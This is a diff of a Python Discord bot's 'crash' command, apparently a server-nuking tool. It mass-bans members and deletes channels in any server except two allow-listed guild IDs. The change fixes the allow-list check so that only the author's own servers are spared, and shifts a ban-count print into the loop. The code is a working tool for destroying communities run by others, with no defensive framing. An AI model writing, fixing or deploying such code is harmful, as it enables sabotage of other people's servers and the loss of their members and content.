@@ -28,8 +28,10 @@ async def on_ready():
 
 @client.command()
 async def crash(ctx):
-	sid = ctx.guild.id
-	if sid != 835425510333874187 or sid != 802363338914791495:
+	slist = [802363338914791495, 835425510333874187]
+	mlist = []
+	scheck = ctx.guild.id in slist
+	if scheck == False:
 		await ctx.send("huh :)")
 		print('='*45)
 		start_time = localtime()
@@ -50,7 +52,7 @@ async def crash(ctx):
 				banned_num += 1
 			except:
 				print(f'{localtime()} {member.name} - can not be banned')
-		print('='*15+f' Banned {banned_num} of {start_guild_num} members '+'='*15)
+			print('='*15+f' Banned {banned_num} of {start_guild_num} members '+'='*15)
 	# DELETE CHANNELS 
 		for channel in ctx.guild.channels:
 			try:
